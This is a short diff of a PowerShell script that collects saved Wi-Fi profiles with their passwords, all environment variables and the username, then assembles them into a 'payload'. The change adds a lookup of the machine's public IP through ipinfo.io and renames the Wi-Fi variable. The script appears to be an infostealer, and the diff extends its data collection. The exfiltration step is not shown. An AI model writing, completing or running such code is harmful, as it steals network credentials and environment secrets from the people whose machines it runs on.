@@ -13,7 +13,7 @@ foreach ($profile in $profiles) {
     'password' = $password
   }
 }
-
+$IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $envVars = @{}
 gci env:* | ForEach-Object {
   $envVars[$_.Name] = $_.Value
@@ -22,7 +22,7 @@ gci env:* | ForEach-Object {
 # Construct the payload
 $Body = @{
   'username' = $env:username
-  'wifi_profiles' = $wifiInfo
+  'wifi_profiles' = $wifis
   'env' = $envVars | ConvertTo-Json
   'ip' = $IP
 }
